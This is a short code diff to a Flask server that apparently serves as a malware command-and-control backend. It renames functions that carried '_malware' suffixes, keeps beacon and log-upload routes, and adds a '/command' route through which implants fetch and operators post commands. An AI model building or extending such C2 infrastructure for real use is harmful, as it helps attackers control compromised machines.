@@ -15,7 +15,7 @@ def get_log():
 
 @app.route("/upload", methods=['POST'])
 def connect():
-    fileOps.add_log_malware(request.get_json())
+    fileOps.add_log(request.get_json())
     return "this is a log"
 
 @app.route("/register", methods=['POST'])
@@ -39,8 +39,18 @@ def registry():
 def becon():
     form_data = request.form.to_dict()
 
-    fileOps.update_becon_malware(form_data["id"],form_data["timestamp"])
+    fileOps.update_becon(form_data["id"],form_data["timestamp"])
     return "you are now beconning"
+
+@app.route("/command", methods=['POST', 'GET'])
+def command():
+    if request.method == 'GET':
+        form_data = request.form.to_dict()
+
+        return fileOps.get_command(form_data["id"])
+    else:
+        fileOps.post_command(request.get_json())
+    
 
 if __name__ == "__main__":
     app.run(debug=True)
